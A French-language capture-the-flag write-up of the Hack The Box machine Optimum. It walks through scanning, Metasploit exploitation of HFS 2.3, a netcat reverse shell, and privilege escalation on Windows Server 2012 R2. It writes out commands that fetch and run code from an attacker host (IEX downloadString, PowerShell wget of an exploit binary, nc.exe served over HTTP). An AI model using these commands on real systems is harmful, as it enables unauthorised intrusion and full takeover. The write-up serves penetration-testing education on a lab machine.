---
title: Restez calme et piratez The Box - Optimum
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2019-10-11T11:31:04.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-optimum
coverImage: https://www.freecodecamp.org/news/content/images/2019/10/126448-1.jpg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: hacking
  slug: hacking
- name: Security
  slug: security
seo_title: Restez calme et piratez The Box - Optimum
seo_desc: Hack The Box (HTB) is an online platform allowing you to test your penetration
  testing skills. It contains several challenges that are constantly updated. Some
  of them simulating real world scenarios and some of them leaning more towards a
  CTF style ...
---

Hack The Box (HTB) est une plateforme en ligne qui vous permet de tester vos compétences en matière de tests d'intrusion. Elle contient plusieurs défis qui sont constamment mis à jour. Certains d'entre eux simulent des scénarios réels et d'autres s'orientent plus vers un style de défi CTF.

**Note**. _Seuls les write-ups des machines HTB retirées sont autorisés._

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-22.25.52.png)

Optimum est une machine de niveau débutant qui se concentre principalement sur l'énumération des services avec des exploits connus. Les deux exploits sont faciles à obtenir et disposent de modules Metasploit associés, ce qui rend cette machine assez simple à compléter.

Nous allons utiliser les outils suivants pour pirater la boîte sur une [Kali Linux box](https://www.kali.org/)

* [nmap](https://nmap.org/)
* [zenmap](https://nmap.org/zenmap/)
* [searchsploit](https://www.exploit-db.com/searchsploit)
* [metasploit](https://www.metasploit.com/)

## Étape 1 - Scanner le réseau

La première étape avant d'exploiter une machine est de faire un peu de scanning et de reconnaissance.

C'est l'une des parties les plus importantes car elle déterminera ce que vous pouvez essayer d'exploiter ensuite. Il est toujours préférable de passer plus de temps sur cette phase pour obtenir autant d'informations que possible.

J'utiliserai Nmap (Network Mapper). Nmap est un utilitaire gratuit et open source pour la découverte de réseau et l'audit de sécurité. Il utilise des paquets IP bruts pour déterminer quels hôtes sont disponibles sur le réseau, quels services ces hôtes offrent, quels systèmes d'exploitation ils exécutent, quel type de filtres de paquets/pare-feu sont utilisés, et des dizaines d'autres caractéristiques.

Il existe de nombreuses commandes que vous pouvez utiliser avec cet outil pour scanner le réseau. Si vous souhaitez en savoir plus, vous pouvez consulter la documentation [ici](https://tools.kali.org/information-gathering/nmap)

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-22.32.54.png)

J'utilise la commande suivante pour avoir une idée de base de ce que nous scannons

```bash
nmap -sV -O -F --version-light 10.10.10.8
```

**-sV:** Sonde les ports ouverts pour déterminer les informations sur le service/la version

**-O:** Active la détection du système d'exploitation

**-F:** Mode rapide - Scanne moins de ports que le scan par défaut

**--version-light:** Limite aux sondes les plus probables (intensité 2)

**10.10.10.8:** Adresse IP de la boîte Optimum

Vous pouvez également utiliser Zenmap, qui est l'interface graphique officielle de Nmap Security Scanner. Il s'agit d'une application multiplateforme, gratuite et open source qui vise à rendre Nmap facile à utiliser pour les débutants tout en fournissant des fonctionnalités avancées pour les utilisateurs expérimentés de Nmap.

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-22.38.49.png)

J'utilise un ensemble différent de commandes pour effectuer un scan intensif

```bash
nmap -A -v 10.10.10.8
```

**-A:** Active la détection du système d'exploitation, la détection de version, le scan de script et le traceroute

**-v:** Augmente le niveau de verbosité

**10.10.10.8:** Adresse IP de la boîte Optimum

Si vous trouvez les résultats un peu trop écrasants, vous pouvez passer à l'onglet **Ports/Hôtes** pour obtenir uniquement les ports ouverts

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-22.39.54.png)

Nous pouvons voir qu'il y a 1 port ouvert :

**Port** 80. Hypertext Transfer Protocol (HTTP). Ici, il s'agit d'un HttpFileServer httpd 2.3

Pour l'instant, c'est notre cible principale

## **Étape 2 - Visiter le site web**

Essayons le **port 80** et visitons **http://10.10.10.8**

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-22.48.59.png)

Nous pouvons voir en bas de la page les informations du serveur. Nous avons un **HttpFileServer 2.3**

Un **HTTP File Server**, également connu sous le nom de HFS, est un serveur web gratuit spécialement conçu pour la publication et le partage de fichiers.

La documentation officielle décrit HFS comme suit :

> HFS (Http File Server) est un logiciel de partage de fichiers qui vous permet d'envoyer et de recevoir des fichiers. Vous pouvez limiter ce partage à quelques amis seulement, ou être ouvert au monde entier. HFS est différent du partage de fichiers classique car il n'y a pas de réseau. HFS est un serveur web qui utilise la technologie web pour être plus compatible avec l'Internet d'aujourd'hui. Puisqu'il s'agit en fait d'un serveur web, vos amis peuvent télécharger des fichiers comme s'ils les téléchargeaient depuis un site web en utilisant un navigateur web, tel qu'Internet Explorer ou Firefox. Vos utilisateurs n'ont pas à installer de nouveau logiciel. HFS vous permet de partager vos fichiers. La plupart des serveurs web sont utilisés pour publier un site web, mais HFS n'est pas conçu pour cela. Vous êtes cependant libre de l'utiliser de la manière que vous souhaitez, mais à vos propres risques.

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-22.50.59.png)
_[https://www.rejetto.com/hfs/](https://www.rejetto.com/hfs/)_

J'utilise **Searchsploit** pour vérifier s'il existe des vulnérabilités connues sur HFS. Searchsploit est un outil de recherche en ligne de commande pour la **[Exploit Database](https://www.exploit-db.com/)**

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-23.04.38.png)

J'utilise la commande suivante

```bash
searchsploit HFS
```

Nous pouvons voir plusieurs vulnérabilités, mais nous allons examiner le **Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)** avec cette commande

```bash
searchsploit -x 34926.rb
```

Nous avons un résumé de l'exploit et le code

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-23-at-21.44.27.png)

Dans la description, nous pouvons voir que

> Rejetto HttpFileServer (HFS) est vulnérable à une attaque d'exécution de commande à distance en raison d'une mauvaise regex dans le fichier ParserLib.pas. Ce module exploite les commandes de script HFS en utilisant '%00' pour contourner le filtrage. Ce module a été testé avec succès sur HFS 2.3b sous Windows XP SP3, Windows 7 SP1 et Windows 8.

Nous pouvons également trouver l'exploit sur le site web de la base de données Exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-23-at-21.46.49.png)
_[https://www.exploit-db.com/exploits/34926](https://www.exploit-db.com/exploits/34926)_

Ainsi que sur le site web de Rapid7

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-23-at-21.48.33.png)
_[https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec](https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec)_

Nous savons que la version de l'application est **HttpFileServer 2.3**

Nous allons utiliser **Metasploit**, qui est un framework de test de pénétration. C'est un outil essentiel pour de nombreux attaquants et défenseurs

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-02-at-21.14.13.png)
_[https://www.metasploit.com/](https://www.metasploit.com/)_

Je lance **Metasploit Framework** sur Kali et cherche la commande à utiliser pour lancer l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-23-at-22.04.47.png)

Si vous souhaitez obtenir plus d'informations sur l'exploit, vous pouvez utiliser la commande suivante

```bash
info exploit/windows/http/rejetto_hfs_exec
```

Et vous obtiendrez des informations détaillées sur l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-23-at-22.06.11.png)

J'utilise la commande suivante pour utiliser l'exploit

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Je dois configurer plusieurs options avant de lancer l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-07-at-23.00.38.png)

Je commence par configurer les **RHOSTS** avec la commande suivante

```bash
set RHOSTS 10.10.10.8
```

et je configure le **SRHVOST** avec

```bash
set SRHVOST 10.10.14.23
```

Lorsque je vérifie les options, j'obtiens ceci

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-07-at-23.05.33.png)

Je lance ensuite l'exploit avec la commande

```bash
exploit
```

Et j'obtiens une session **Meterpreter**

Sur le site web d'[Offensive Security](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/), nous obtenons cette définition pour Meterpreter

> Meterpreter est une charge utile avancée, dynamiquement extensible, qui utilise des injecteurs de DLL _in-memory_ et est étendue sur le réseau au moment de l'exécution. Il communique via la socket de l'injecteur et fournit une API Ruby complète côté client. Il dispose de l'historique des commandes, de la complétion par tabulation, des canaux, et plus encore.

Vous pouvez en savoir plus sur Meterpreter [ici](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/).

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-07-at-23.07.56.png)

Commençons par recueillir quelques informations

**getuid** retourne l'ID utilisateur réel du processus appelant et **sysinfo** retourne certaines statistiques sur l'utilisation de la mémoire et du swap, ainsi que la charge moyenne

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-07-at-23.11.30.png)

Si nous regardons de près, nous pouvons voir que l'architecture d'Optimum est **x64**, mais notre version de meterpreter est configurée en x86. Nous devrons changer cela !

Je mets cette session en arrière-plan avec la commande

```bash
background
```

Je vérifie les options du module une fois de plus et je vois que les options de charge utile ne sont pas correctement configurées

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-07-at-23.17.10.png)

Il utilise

```bash
windows/meterpreter/reverse_tcp
```

au lieu de

```bash
windows/x64/meterpreter/reverse_tcp
```

Je configure la charge utile avec la commande suivante

```bash
set payload windows/x64/meterpreter/reverse_tcp
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-07-at-23.20.25.png)

J'obtiens une autre session meterpreter, et lorsque je vérifie le **sysinfo**, je peux voir que j'ai la bonne version de meterpreter cette fois, **x64/windows**

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-07-at-23.22.10.png)

## **Étape 3 -** Recherche du flag user.txt

Maintenant que j'ai une session, je peux lister tous les fichiers/dossiers avec la commande suivante

```bash
ls
```

Et je trouve le flag utilisateur ! Je peux vérifier le contenu du fichier avec

```bash
cat user.txt.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-07-at-23.25.45.png)

J'essaie de naviguer vers le dossier Administrator mais j'obtiens un message d'accès refusé. Je dois effectuer une élévation de privilèges pour capturer le flag root.txt

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-19.56.27.png)



## **Étape 4 - Utilisation de Metasploit pour l'élévation de privilèges** 

J'utiliserai le module **post/multi/recon/local_exploiter_suggester**

Sur le site web de Rapid7, j'obtiens ceci

> Ce module suggère des exploits locaux meterpreter qui peuvent être utilisés. Les exploits sont suggérés en fonction de l'architecture et de la plateforme sur lesquelles l'utilisateur a ouvert une session, ainsi que des exploits disponibles dans meterpreter. Il est important de noter que tous les exploits locaux ne seront pas déclenchés. Les exploits sont choisis en fonction de ces conditions : type de session, plateforme, architecture et options par défaut requises.

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.09.35.png)

Je vérifie les options et je liste toutes les sessions pour m'assurer de choisir la bonne

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.09.46.png)

Je configure la session 2 pour pointer l'exploit vers la session meterpreter x64

```bash
set SESSION 2
```

 et je configure la description pour avoir une explication détaillée de tout exploit suggéré

```bash
set SHOWDESCRIPTION true
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.10.05.png)

Je lance l'exploit mais rien ne semble revenir

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.10.12.png)

En revenant à la deuxième session avec

```bash
sessions 2
```

et en vérifiant sysinfo une fois de plus, nous obtenons plus d'informations sur le système d'exploitation. Nous pouvons voir qu'il s'agit d'un Windows 2012 R2

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.13.59.png)

Je fais une recherche Google pour trouver un exploit d'élévation de privilèges sur Windows 2012 R2 et je trouve cet exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.16.11.png)
_[https://www.rapid7.com/db/modules/exploit/windows/local/ms16_032_secondary_logon_handle_privesc](https://www.rapid7.com/db/modules/exploit/windows/local/ms16_032_secondary_logon_handle_privesc)_

Ainsi que le bulletin de sécurité officiel de Microsoft sur MS16-032

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.19.27.png)
_[https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)_

De retour sur Metasploit, je vérifie s'il existe un exploit disponible et j'en trouve un avec 

```bash
search ms16-032
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.47.07.png)

Je vérifie les options et configure la **session**

```bash
set SESSION 3
```

le **LHOST**

```bash
set LHOST 10.10.14.27
```

et la **cible** sur Windows x64

```bash
set TARGET 1
```

Je vérifie les options pour voir si tout est configuré correctement

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.44.38.png)

Je lance l'exploit mais il ne semble plus fonctionner. Je vais devoir l'exploiter manuellement sans l'aide de Metasploit !

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.44.46.png)



## **Étape 5 - Création d'un** reverse shell à faible privilège

De retour sur searchsploit, je vérifie les résultats de 

```bash
searchsploit HFS
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-20.58.57.png)

Je peux voir plusieurs vulnérabilités, mais je vais examiner le **'2.3.x - Remote Command Execution (1)'** en premier avec cette commande

```bash
searchsploit -x 34668.txt
```

J'ai une explication de l'exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-23.08.17.png)

J'examine ensuite le **'2.3.x - Remote Command Execution (2)'** avec cette commande

```bash
searchsploit -x 39161.py
```

J'ai un résumé de l'exploit et le code. Je regarde ensuite le code et la description

> Vous pouvez utiliser HFS (HTTP File Server) pour envoyer et recevoir des fichiers. Il est différent du partage de fichiers classique car il utilise la technologie web pour être plus compatible avec l'Internet d'aujourd'hui. Il diffère également des serveurs web classiques car il est très facile à utiliser et fonctionne "dès la sortie de la boîte". Accédez à vos fichiers distants, via le réseau. Il a été testé avec succès avec Wine sous Linux.

Puis à la note qui explique qu'il dépend d'un serveur web pour télécharger et utiliser **nc.exe** pour obtenir le reverse shell

> Vous devez utiliser un serveur web hébergeant netcat (http://<attackers_ip>:80/nc.exe)

![Image](https://www.freecodecamp.org/news/content/images/2019/09/Screenshot-2019-09-21-at-23.10.46.png)

Si vous consultez la section d'aide de **searchsploit**, nous pouvons copier un exploit dans le répertoire courant

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.02.54.png)

J'utilise la commande suivante pour copier le fichier

```bash
searchsploit -m 39161.py
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.03.04.png)

Ensuite, j'utilise cette commande pour modifier le fichier

```bash
nano 39161.py
```

et je change l'adresse IP codée en dur par celle de la machine attaquante - ma machine dans ce cas

```bash
ip_addr = "10.10.14.27" #local IP address
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.08.49.png)

Je crée un dossier **www** 

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.13.27.png)

et je copie **nc.exe**

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.13.37.png)

Je lance l'exploit. Dans la première fenêtre en haut à gauche, je lance un petit serveur python avec 

```bash
python -m SimpleHTTPServer 80
```

Le module **SimpleHTTPServer** qui vient avec Python est un serveur HTTP simple qui fournit des gestionnaires de requêtes GET et HEAD standard

La deuxième fenêtre en haut à droite a netcat en écoute. Je configure un écouteur **Ncat** sur le port **443** pour capturer la connexion du reverse shell

> Ncat est un utilitaire réseau riche en fonctionnalités qui lit et écrit des données à travers les réseaux à partir de la ligne de commande. Ncat a été écrit pour le projet Nmap comme une réimplémentation grandement améliorée du vénérable [Netcat](http://sectools.org/tool/netcat/). Il utilise à la fois TCP et UDP pour la communication et est conçu pour être un outil backend fiable pour fournir instantanément une connectivité réseau à d'autres applications et utilisateurs

Vous pouvez en savoir plus sur Ncat [ici](https://nmap.org/book/ncat-man.html)

```bash
nc -nvlp 443 10.10.10.8
```

La troisième fenêtre contient l'exploit python - j'ai dû lancer le script deux fois, une pour déclencher **nc.exe** et l'autre pour obtenir le reverse shell

L'exploit python (3ème fenêtre) se connectera au serveur python (1ère fenêtre) pour télécharger le binaire Windows nc.exe. Ensuite, nc.exe se connecte à l'écouteur Ncat sur le port 443 (2ème fenêtre) et créera un reverse shell à faible privilège

```bash
python 39161.py 10.10.10.8 80
```

Vous pouvez vérifier que l'utilisateur est Kostas sur cette machine

```bash
C:\Users\kostas\Desktop>
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.22.30.png)

Je peux ensuite naviguer sur la machine de Kostas pour obtenir le flag utilisateur !

Je vérifie qui je suis sur la machine avec la commande,

```bash
whoami
```

liste les fichiers/dossiers avec

```bash
dir
```

et affiche le contenu du flag utilisateur avec

```bash
type user.txt.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.28.24.png)

Je trouve le flag utilisateur ! Obtenons le flag root maintenant :)

## **Étape 6a - Utilisation de** GDSSecurity/**Windows-Exploit-Suggester**

J'affiche les informations système avec

```bash
systeminfo
```

Je copie/colle les résultats dans un fichier **systeminfo.txt**

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.55.44.png)

J'utiliserai Windows-Exploit-Suggester de [GDSSecurity](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

> Cet outil compare les niveaux de correctifs d'une cible avec la base de données des vulnérabilités de Microsoft afin de détecter les correctifs potentiellement manquants sur la cible. Il notifie également l'utilisateur s'il existe des exploits publics et des modules Metasploit disponibles pour les bulletins manquants.

> Il nécessite la sortie de la commande 'systeminfo' d'un hôte Windows afin de comparer cela avec la base de données des bulletins de sécurité de Microsoft et de déterminer le niveau de correctif de l'hôte.

> Il a la capacité de télécharger automatiquement la base de données des bulletins de sécurité de Microsoft avec le drapeau --update, et de la sauvegarder sous forme de feuille de calcul Excel.

Je copie/colle le script python brut windows-exploit-suggester dans un fichier puis je modifie le fichier 

```bash
nano windows-exploit-suggester.py
```

pour coller le code du [dépôt GitHub](https://raw.githubusercontent.com/GDSSecurity/Windows-Exploit-Suggester/master/windows-exploit-suggester.py). Nous avons maintenant nos 2 fichiers dans le même dossier, **systeminfo.txt** et **windows-exploit-suggester.py**

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.45.45.png)

Je peux en savoir plus sur cet outil avec la commande suivante

```bash
python windows-exploit-suggester.py -h
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.45.56.png)

Je mets à jour la base de données de l'outil avec la commande suivante

```bash
python windows-exploit-suggester.py --update
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.52.56.png)

J'exécute le script avec

```bash
python windows-exploit-suggester.py --systeminfo systeminfo.txt --database 2019-10-08-mssb.xls
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-21.59.39.png)

Je peux voir qu'il manque plusieurs CVEs sur cette machine. Je vais cibler la vulnérabilité MS16-032

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-22.01.59.png)

## Étape 6b - Utilisation de Sherlock pour énumérer les KBs

J'utiliserai Sherlock pour énumérer les KB sur cette machine. Sherlock est un script PowerShell pour trouver rapidement les correctifs logiciels manquants pour les vulnérabilités d'élévation de privilèges locaux.

Vous pouvez en savoir plus sur Sherlock [ici](https://github.com/rasta-mouse/Sherlock)

Lorsque j'ai exécuté la commande sysinfo dans **l'étape 6a**, je pouvais voir une liste de KBs. KB signifie Knowledge Base. Microsoft la définit comme

> La base de connaissances Microsoft contient plus de 150 000 articles. Ces articles ont été créés par des milliers de professionnels du support qui ont résolu des problèmes pour nos clients. La base de connaissances Microsoft est régulièrement mise à jour, élargie et affinée pour aider à garantir que vous avez accès aux informations les plus récentes.

Vous pouvez en savoir plus sur KB [ici](https://support.microsoft.com/en-gb/help/242450/how-to-query-the-microsoft-knowledge-base-by-using-keywords-and-query)

Je clone le dépôt Sherlock sur mon local et le déplace dans le dossier **www/**

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-09-at-23.27.00.png)

Je modifie le fichier **Sherlock.ps1** et ajoute **Find-Allvulns** à la fin du script PowerShell avec

```bash
nano Sherlock.ps1
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-09-at-23.29.42.png)

J'utilise ensuite la commande suivante

```bash
wget "http://10.10.14.27//sherlock/Sherlock.ps1"
```

pour récupérer le fichier depuis la machine de Kostas

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-09-at-23.28.02.png)

Je lance ensuite Sherlock avec la commande suivante

```bash
IEX(New-Object Net.Webclient).downloadString('http://10.10.14.27/sherlock/Sherlock.ps1')
```

Il passera en revue tous les KB

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-09-at-23.25.18.png)

et retourne ceux qui sont vulnérables

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-09-at-23.31.00.png)

## **Étape 7 - Utilisation de RGNOBJ Integer Overflow pour l'élévation de privilèges**

À **l'étape 6a**, lorsque j'ai obtenu le résultat du Windows Exploit Suggester, l'un des exploits cible Windows 8.1 (x64)

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-23.05.34.png)

Si nous regardons la documentation Microsoft, nous pouvons voir que Windows Server 2012 R2 est lié à Windows 8.1 et a le même numéro de build. Nous pouvons supposer que l'exploit pourrait également fonctionner sur celui-ci

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-10-at-21.57.48.png)
_[https://docs.microsoft.com/en-gb/windows/win32/sysinfo/operating-system-version?redirectedfrom=MSDN](https://docs.microsoft.com/en-gb/windows/win32/sysinfo/operating-system-version?redirectedfrom=MSDN)_

Je cherche sur **searchsploit**

```bash
searchsploit m16-098
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-23.08.45.png)

Je peux également le trouver sur le site web de la base de données Exploit

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-23.08.01.png)
_[https://www.exploit-db.com/exploits/41020](https://www.exploit-db.com/exploits/41020)_

J'utilise la commande suivante pour copier le fichier

```bash
searchsploit -m 41020.c
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-23.10.30.png)

L'exploit doit être compilé avant de pouvoir être exécuté. Je vérifie le code avec

```bash
cat 41020.c
```

Je peux voir dans les commentaires que l'exploit dispose d'un binaire Windows précompilé disponible qui peut être utilisé

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-23.13.59.png)

Je copie l'exploit avec la commande **wget** et déplace le fichier dans mon dossier **www**

```bash
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-23.19.11.png)

Je configure un autre serveur python - je tue le précédent. 

```bash
python -m SimpleHTTPServer 80
```

Dans l'autre fenêtre, sur la machine de Kostas, j'utilise powershell pour télécharger l'exploit

```bash
powershell wget "http://10.10.14.27/41020.exe" -outfile "exploit.exe"
```

J'exécute ensuite l'exploit avec

```bash
exploit.exe
```

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-23.24.54.png)

Je peux voir que l'élévation de privilèges a réussi en vérifiant qui je suis sur la machine

```bash
whoami
```

 Il retourne

```bash
nt authority\system
```

Je suis admin

Trouvons le flag root maintenant ! Je navigue jusqu'à Users et vérifie dans le dossier Administrator/Desktop. Je trouve le flag !

![Image](https://www.freecodecamp.org/news/content/images/2019/10/Screenshot-2019-10-08-at-23.28.14.png)

J'utilise la commande suivante pour voir le contenu du fichier

```bash
type root.txt
```

Félicitations ! Vous avez trouvé les deux flags !

---

N'hésitez pas à commenter, poser des questions ou partager avec vos amis :)

Vous pouvez voir plus de mes articles [ici](https://www.freecodecamp.org/news/author/sonya/)

Vous pouvez me suivre sur [Twitter](https://twitter.com/SonyaMoisset) ou sur [LinkedIn](https://www.linkedin.com/in/sonyamoisset/)

Et n'oubliez pas de #**GetSecure**, #**BeSecure** & #**StaySecure** !

---

**Autres articles Hack The Box**

* [Restez calme et piratez The Box - Lame](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
* [Restez calme et piratez The Box - Legacy](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)
* [Restez calme et piratez The Box - Devel](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-devel/)
* [Restez calme et piratez The Box - Beep](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/)

![Image](https://www.freecodecamp.org/news/content/images/2019/10/126448.jpg)